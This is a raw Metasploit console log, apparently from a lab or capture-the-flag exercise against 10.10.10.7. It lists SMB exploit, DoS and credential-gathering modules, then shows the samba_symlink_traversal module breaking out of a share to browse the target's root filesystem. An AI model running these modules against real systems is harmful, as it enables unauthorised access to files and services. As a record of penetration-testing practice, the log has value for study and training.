+   20   auxiliary/dos/windows/[45msmb[0m/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
+   21   auxiliary/dos/windows/[45msmb[0m/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
+   22   auxiliary/dos/windows/[45msmb[0m/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
+   23   auxiliary/dos/windows/[45m[45msmb[0m[0m/ms09_050_[45m[45msmb[0m[0m2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS [45mSMB[0m Negotiate ProcessID Function Table Dereference
+   24   auxiliary/dos/windows/[45m[45msmb[0m[0m/ms09_050_[45m[45msmb[0m[0m2_session_logoff                           normal     No     Microsoft SRV2.SYS [45mSMB[0m2 Logoff Remote Kernel NULL Pointer Dereference
+   25   auxiliary/dos/windows/[45msmb[0m/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 [45mSMB[0m Client Infinite Loop
+   26   auxiliary/dos/windows/[45msmb[0m/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS Srv[45mSmb[0mQueryFsInformation Pool Overflow DoS
+   27   auxiliary/dos/windows/[45msmb[0m/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
+   28   auxiliary/dos/windows/[45msmb[0m/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
+   29   auxiliary/dos/windows/[45msmb[0m/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 [45mSMB[0m Negotiate Protocol DoS
+   30   auxiliary/fileformat/multidrop                                                   normal     No     Windows [45mSMB[0m Multi Dropper
+   31   auxiliary/fileformat/odt_badodt                                 2018-05-01       normal     No     LibreOffice 6.03 /Apache OpenOffice 4.1.5 Malicious ODT File Generator
+   32   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m2_negotiate_corrupt                                     normal     No     [45m[45mSMB[0m[0m Negotiate [45m[45mSMB[0m[0m2 Dialect Corruption
+   33   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_create_pipe                                            normal     No     [45mSMB[0m Create Pipe Request Fuzzer
+   34   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_create_pipe_corrupt                                    normal     No     [45mSMB[0m Create Pipe Request Corruption
+   35   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_negotiate_corrupt                                      normal     No     [45mSMB[0m Negotiate Dialect Corruption
+   36   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_ntlm1_login_corrupt                                    normal     No     [45mSMB[0m NTLMv1 Login Request Corruption
+   37   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_tree_connect                                           normal     No     [45mSMB[0m Tree Connect Request Fuzzer
+   38   auxiliary/fuzzers/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_tree_connect_corrupt                                   normal     No     [45mSMB[0m Tree Connect Request Corruption
+   39   auxiliary/gather/konica_minolta_pwd_extract                                      normal     No     Konica Minolta Password Extractor
+   40   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   41   auxiliary/scanner/sap/sap_[45msmb[0m_relay                                              normal     No     SAP [45mSMB[0m Relay Abuse
+   42   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   43   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   44   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   45   auxiliary/scanner/[45msmb[0m/impacket/dcomexec                         2018-03-19       normal     No     DCOM Exec
+   46   auxiliary/scanner/[45msmb[0m/impacket/secretsdump                                       normal     No     DCOM Exec
+   47   auxiliary/scanner/[45msmb[0m/impacket/wmiexec                          2018-03-19       normal     No     WMI Exec
+   48   auxiliary/scanner/[45msmb[0m/pipe_auditor                                               normal     No     [45mSMB[0m Session Pipe Auditor
+   49   auxiliary/scanner/[45msmb[0m/pipe_dcerpc_auditor                                        normal     No     [45mSMB[0m Session Pipe DCERPC Auditor
+   50   auxiliary/scanner/[45msmb[0m/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
+   51   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m1                                                       normal     No     [45mSMB[0mv1 Protocol Detection
+   52   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m2                                                       normal     No     [45mSMB[0m 2.0 Protocol Detection
+   53   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_enum_gpp                                               normal     No     [45mSMB[0m Group Policy Preference Saved Passwords Enumeration
+   54   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_enumshares                                             normal     No     [45mSMB[0m Share Enumeration
+   55   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_enumusers                                              normal     No     [45mSMB[0m User Enumeration (SAM EnumUsers)
+   56   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_enumusers_domain                                       normal     No     [45mSMB[0m Domain User Enumeration
+   57   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_login                                                  normal     No     [45mSMB[0m Login Check Scanner
+   58   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_lookupsid                                              normal     No     [45mSMB[0m SID User Enumeration (LookupSid)
+   59   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_ms17_010                                               normal     No     MS17-010 [45mSMB[0m RCE Detection
+   60   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_uninit_cred                                            normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   61   auxiliary/scanner/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_version                                                normal     No     [45mSMB[0m Version Detection
+   62   auxiliary/scanner/snmp/snmp_enumshares                                           normal     No     SNMP Windows [45mSMB[0m Share Enumeration
+   63   auxiliary/server/capture/[45msmb[0m                                                     normal     No     Authentication Capture: [45mSMB[0m
+   64   auxiliary/server/http_ntlmrelay                                                  normal     No     HTTP Client MS Credential Relayer
+   65   auxiliary/spoof/nbns/nbns_response                                               normal     No     NetBIOS Name Service Spoofer
+   66   exploit/linux/samba/chain_reply                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   67   exploit/multi/http/struts_code_exec_classloader                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   68   exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   69   exploit/netware/[45msmb[0m/lsass_cifs                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   70   exploit/osx/browser/safari_file_policy                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
+   71   exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       [32mexcellent[0m  No     Sun Java Web Start Plugin Command Line Argument Injection
+   72   exploit/windows/browser/java_ws_double_quote                    2012-10-16       [32mexcellent[0m  No     Sun Java Web Start Double Quote Injection
+   73   exploit/windows/browser/java_ws_vmargs                          2012-02-14       [32mexcellent[0m  No     Sun Java Web Start Plugin Command Line Argument Injection
+   74   exploit/windows/browser/ms10_022_ie_vbscript_winhlp32           2010-02-26       [32mgreat[0m      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
+   75   exploit/windows/fileformat/ms13_071_theme                       2013-09-10       [32mexcellent[0m  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
+   76   exploit/windows/fileformat/ms14_060_sandworm                    2014-10-14       [32mexcellent[0m  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   77   exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
+   78   exploit/windows/fileformat/vlc_[45msmb[0m_uri                          2009-06-24       [32mgreat[0m      No     VideoLAN Client (VLC) Win32 [45msmb[0m:// URI Buffer Overflow
+   79   exploit/windows/http/generic_http_dll_injection                 2015-03-04       manual     No     Generic Web Application DLL Injection
+   80   exploit/windows/local/cve_2020_0796_[45msmb[0mghost                    2020-03-13       good       Yes    [45mSMB[0mv3 Compression Buffer Overflow
+   81   exploit/windows/misc/hp_dataprotector_cmd_exec                  2014-11-02       [32mexcellent[0m  Yes    HP Data Protector 8.10 Remote Command Execution
+   82   exploit/windows/misc/hp_dataprotector_install_service           2011-11-02       [32mexcellent[0m  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
+   83   exploit/windows/oracle/extjob                                   2007-01-01       [32mexcellent[0m  Yes    Oracle Job Scheduler Named Pipe Command Execution
+   84   exploit/windows/scada/ge_proficy_cimplicity_gefebt              2014-01-23       [32mexcellent[0m  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
+   85   exploit/windows/[45m[45msmb[0m[0m/generic_[45m[45msmb[0m[0m_dll_injection                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
+   86   exploit/windows/[45msmb[0m/group_policy_startup                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   87   exploit/windows/[45msmb[0m/ipass_pipe_exec                             2015-01-21       [32mexcellent[0m  Yes    IPass Control Pipe Remote Command Execution
+   88   exploit/windows/[45msmb[0m/ms03_049_netapi                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   89   exploit/windows/[45msmb[0m/ms04_007_killbill                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   90   exploit/windows/[45msmb[0m/ms04_011_lsass                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   91   exploit/windows/[45msmb[0m/ms04_031_netdde                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
+   92   exploit/windows/[45msmb[0m/ms05_039_pnp                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
+   93   exploit/windows/[45msmb[0m/ms06_025_rasmans_reg                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   94   exploit/windows/[45msmb[0m/ms06_025_rras                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
+   95   exploit/windows/[45msmb[0m/ms06_040_netapi                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   96   exploit/windows/[45msmb[0m/ms06_066_nwapi                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   97   exploit/windows/[45msmb[0m/ms06_066_nwwks                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
+   98   exploit/windows/[45msmb[0m/ms06_070_wkssvc                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   99   exploit/windows/[45msmb[0m/ms07_029_msdns_zonename                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow ([45mSMB[0m)
+   100  exploit/windows/[45msmb[0m/ms08_067_netapi                             2008-10-28       [32mgreat[0m      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   101  exploit/windows/[45m[45msmb[0m[0m/ms09_050_[45m[45msmb[0m[0m2_negotiate_func_index          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS [45mSMB[0m Negotiate ProcessID Function Table Dereference
+   102  exploit/windows/[45msmb[0m/ms10_046_shortcut_icon_dllloader            2010-07-16       [32mexcellent[0m  No     Microsoft Windows Shell LNK Code Execution
+   103  exploit/windows/[45msmb[0m/ms10_061_spoolss                            2010-09-14       [32mexcellent[0m  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   104  exploit/windows/[45msmb[0m/ms15_020_shortcut_icon_dllloader            2015-03-10       [32mexcellent[0m  No     Microsoft Windows Shell LNK Code Execution
+   105  exploit/windows/[45msmb[0m/ms17_010_eternalblue                        2017-03-14       average    Yes    MS17-010 EternalBlue [45mSMB[0m Remote Windows Kernel Pool Corruption
+   106  exploit/windows/[45msmb[0m/ms17_010_eternalblue_win8                   2017-03-14       average    No     MS17-010 EternalBlue [45mSMB[0m Remote Windows Kernel Pool Corruption for Win8+
+   107  exploit/windows/[45msmb[0m/ms17_010_psexec                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion [45mSMB[0m Remote Windows Code Execution
+   108  exploit/windows/[45msmb[0m/netidentity_xtierrpcpipe                    2009-04-06       [32mgreat[0m      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   109  exploit/windows/[45msmb[0m/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+   110  exploit/windows/[45msmb[0m/psexec_psh                                  1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
+   111  exploit/windows/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_delivery                                2016-07-26       [32mexcellent[0m  No     [45mSMB[0m Delivery
+   112  exploit/windows/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_doublepulsar_rce                        2017-04-14       [32mgreat[0m      Yes    [45mSMB[0m DOUBLEPULSAR Remote Code Execution
+   113  exploit/windows/[45m[45msmb[0m[0m/[45m[45msmb[0m[0m_relay                                   2001-03-31       [32mexcellent[0m  No     MS08-068 Microsoft Windows [45mSMB[0m Relay Code Execution
+   114  exploit/windows/[45msmb[0m/timbuktu_plughntcommand_bof                 2009-06-25       [32mgreat[0m      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+   115  exploit/windows/[45msmb[0m/webexec                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
+   116  payload/windows/meterpreter/reverse_named_pipe                                   normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe ([45mSMB[0m) Stager
+   117  payload/windows/x64/meterpreter/reverse_named_pipe                               normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe ([45mSMB[0m) Stager
+   118  post/linux/busybox/[45msmb[0m_share_root                                                normal     No     BusyBox [45mSMB[0m Sharing
+   119  post/linux/gather/mount_cifs_creds                                               normal     No     Linux Gather Saved mount.cifs/mount.[45msmb[0mfs Credentials
+   120  post/windows/escalate/droplnk                                                    normal     No     Windows Escalate [45mSMB[0m Icon LNK Dropper
+   121  post/windows/gather/credentials/gpp                                              normal     No     Windows Gather Group Policy Preference Saved Passwords
+   122  post/windows/gather/enum_shares                                                  normal     No     Windows Gather [45mSMB[0m Share Enumeration via Registry
+   123  post/windows/gather/netlm_downgrade                                              normal     No     Windows NetLM Downgrade Attack
+   124  post/windows/gather/word_unc_injector                                            normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+
+
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use auxiliary/admin/smb/
+use auxiliary/admin/smb/check_dir_file           use auxiliary/admin/smb/psexec_command
+use auxiliary/admin/smb/delete_file              use auxiliary/admin/smb/psexec_ntdsgrab
+use auxiliary/admin/smb/download_file            use auxiliary/admin/smb/samba_symlink_traversal
+use auxiliary/admin/smb/list_directory           use auxiliary/admin/smb/upload_file
+use auxiliary/admin/smb/ms17_010_command         use auxiliary/admin/smb/webexec_command
+[4mmsf5[0m [0m> use auxiliary/admin/smb/samba_symlink_traversal 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/samba_symlink_traversal):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      445              yes       The SMB service port (TCP)
+   SMBSHARE                    yes       The name of a writeable share on the server
+   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> se[K[Kset rhosts 10.10.10.7
+[0mrhosts => 10.10.10.7
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> set smbshare tmp 
+[0msmbshare => tmp
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> show options p[K
+[0m
+Module options (auxiliary/admin/smb/samba_symlink_traversal):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS     10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      445              yes       The SMB service port (TCP)
+   SMBSHARE   tmp              yes       The name of a writeable share on the server
+   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> exmp[K[Kploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Trying to mount writeable share 'tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Trying to link 'rootfs' to the root filesystem...
+[1m[31m[-][0m 10.10.10.7:445 - Auxiliary failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_COLLISION (Command=50 WordCount=0)
+[1m[31m[-][0m 10.10.10.7:445 - Call stack:
+[1m[31m[-][0m 10.10.10.7:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:264:in `smb_recv_parse'
+[1m[31m[-][0m 10.10.10.7:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1686:in `trans2'
+[1m[31m[-][0m 10.10.10.7:445 -   /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1807:in `symlink'
+[1m[31m[-][0m 10.10.10.7:445 -   /usr/share/metasploit-framework/modules/auxiliary/admin/smb/samba_symlink_traversal.rb:57:in `run'
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Trying to mount writeable share 'tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Trying to link 'rootfs' to the root filesystem...
+[1m[34m[*][0m 10.10.10.7:445 - Now access the following share to browse the root filesystem:
+[1m[34m[*][0m 10.10.10.7:445 - 	\\10.10.10.7\tmp\rootfs\
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> use ad[K[Kauxiliary/admin/smb/
+use auxiliary/admin/smb/check_dir_file           use auxiliary/admin/smb/psexec_command
+use auxiliary/admin/smb/delete_file              use auxiliary/admin/smb/psexec_ntdsgrab
+use auxiliary/admin/smb/download_file            use auxiliary/admin/smb/samba_symlink_traversal
+use auxiliary/admin/smb/list_directory           use auxiliary/admin/smb/upload_file
+use auxiliary/admin/smb/ms17_010_command         use auxiliary/admin/smb/webexec_command
+[4mmsf5[0m auxiliary([1m[31madmin/smb/samba_symlink_traversal[0m) [0m> use auxiliary/admin/smb/list_directory 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                      no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  C$               yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> sey[Kt s[Krhosts 10.10.10.7
+[0mrhosts => 10.10.10.7
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set smbshare tmp
+[0msmbshare => tmp
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                      no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\
+======================================
+
+  SIZE   TYPE  TIME                   FILENAME
+  ----   ----  ----                   --------
+  0 B    D     2020-08-17 23:08:23PM  ..
+  0 B    D     2020-08-17 23:08:23PM  pulse-bee
+  11 B   F     2020-08-17 23:08:23PM  .X0-lock
+  0 B    D     2020-08-17 23:08:23PM  rootfs
+  0 B    D     2020-08-17 23:08:23PM  .X11-unix
+  118 B  F     2020-08-17 23:08:23PM  .gdmPQC7O0
+  0 B    D     2020-08-17 23:08:23PM  .ICE-unix
+  0 B    D     2020-08-17 23:08:23PM  virtual-bee.HNqBBY
+  0 B    D     2020-08-17 23:08:23PM  keyring-QpY327
+  0 B    D     2020-08-17 23:08:23PM  vmware-root
+  0 B    D     2020-08-17 23:08:23PM  Tracker-bee.7217
+  0 B    D     2020-08-17 23:08:23PM  vmware-bee
+  0 B    D     2020-08-17 23:08:23PM  gconfd-bee
+  11 B   F     2020-08-17 23:08:23PM  .X1-lock
+  0 B    F     2020-08-17 23:08:23PM  tmp.zoWrWc6891
+  0 B    D     2020-08-17 23:08:23PM  .esd-1000
+  0 B    D     2020-08-17 23:08:23PM  seahorse-53LhjG
+  0 B    D     2020-08-17 23:08:23PM  ssh-rSFowk6767
+  0 B    D     2020-08-17 23:08:33PM  orbit-bee
+  0 B    F     2020-08-18 00:08:11AM  php.socket-0
+  0 B    F     2020-08-18 00:08:11AM  php.socket-1
+  0 B    D     2020-08-18 01:08:14AM  .
+  0 B    D     2020-08-18 04:08:40AM  VMwareDnD
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                      no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rp
+set rpath  set rport  
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rpath
+[0m[1m[31m[-][0m Unknown variable
+Usage: set [option] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> set rpath [C r o o t f s 
+[0mrpath => rootfs
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs           no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> exploit 
+[0m[1m[34m[*][0m Running module against 10.10.10.7
+
+[1m[34m[*][0m 10.10.10.7:445 - Connecting to the server...
+[1m[34m[*][0m 10.10.10.7:445 - Mounting the remote share \\10.10.10.7\tmp'...
+[1m[34m[*][0m 10.10.10.7:445 - Listing \\10.10.10.7\tmp\rootfs'...
+[1m[34m[*][0m 10.10.10.7:445 - Directory Listing of \\10.10.10.7\tmp\rootfs
+============================================
+
+  SIZE    TYPE  TIME                   FILENAME
+  ----    ----  ----                   --------
+  1.8 MB  F     2008-04-10 22:04:36PM  vmlinuz
+  0 B     D     2008-04-22 23:04:57PM  opt
+  0 B     D     2008-04-22 23:04:57PM  media
+  0 B     D     2008-04-22 23:04:57PM  initrd
+  0 B     D     2008-04-22 23:04:57PM  srv
+  0 B     D     2013-03-29 00:03:07AM  bin
+  0 B     D     2013-03-29 00:03:57AM  cdrom
+  0 B     D     2013-03-29 00:03:57AM  lost+found
+  0 B     D     2013-03-29 01:03:04AM  usr
+  0 B     D     2013-03-29 01:03:04AM  lib64
+  0 B     D     2013-03-29 01:03:32AM  mnt
+  0 B     D     2013-03-29 01:03:42AM  boot
+  7.1 MB  F     2013-03-29 01:03:42AM  initrd.img
+  0 B     D     2013-03-29 06:03:02AM  sbin
+  0 B     D     2013-04-01 22:04:03PM  lib
+  0 B     D     2013-04-02 02:04:26AM  toolbox
+  0 B     D     2013-12-12 17:12:16PM  home
+  0 B     D     2014-04-19 00:04:09AM  var
+  0 B     D     2020-08-17 23:08:23PM  .
+  0 B     D     2020-08-17 23:08:23PM  ..
+  0 B     D     2020-08-17 23:08:23PM  etc
+  0 B     D     2020-08-17 23:08:23PM  root
+  0 B     D     2020-08-17 23:08:23PM  dev
+  0 B     D     2020-08-18 01:08:14AM  tmp
+  0 B     D     2020-08-18 04:08:40AM  sys
+  0 B     D     2020-08-18 04:08:40AM  proc
+
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> ll
+[0m^L[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> [H[2J[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> use auxiliary/admin/smb/
+use auxiliary/admin/smb/check_dir_file           use auxiliary/admin/smb/psexec_command
+use auxiliary/admin/smb/delete_file              use auxiliary/admin/smb/psexec_ntdsgrab
+use auxiliary/admin/smb/download_file            use auxiliary/admin/smb/samba_symlink_traversal
+use auxiliary/admin/smb/list_directory           use auxiliary/admin/smb/upload_file
+use auxiliary/admin/smb/ms17_010_command         use auxiliary/admin/smb/webexec_command
+[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> use auxiliary/admin/smb/ip[K[Kupload_file 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> show options 
+[0m
+Module options (auxiliary/admin/smb/upload_file):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILE_LPATHS                   no        A file containing a list of local files to utilize
+   FILE_RPATHS                   no        A file containing a list remote files relative to the share to operate on
+   LPATH                         no        The path of the local file to utilize
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH                         no        The name of the remote file relative to the share to operate on
+   RPORT        445              yes       The SMB service port (TCP)
+   SMBDomain    .                no        The Windows domain to use for authentication
+   SMBPass                       no        The password for the specified username
+   SMBSHARE     C$               yes       The name of a writeable share on the server
+   SMBUser                       no        The username to authenticate as
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+
+[4mmsf5[0m auxiliary([1m[31madmin/smb/upload_file[0m) [0m> back
+[0m[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use auxiliary/admin/smb/list_directory 
+[0m[4mmsf5[0m auxiliary([1m[31madmin/smb/list_directory[0m) [0m> show p[[K[Koptions 
+[0m
+Module options (auxiliary/admin/smb/list_directory):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   RHOSTS    10.10.10.7       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPATH     rootfs           no        The name of the remote directory relative to the share
+   RPORT     445              yes       The SMB service port (TCP)
+   SMBSHARE  tmp              yes       The name of a writeable share on the server
+
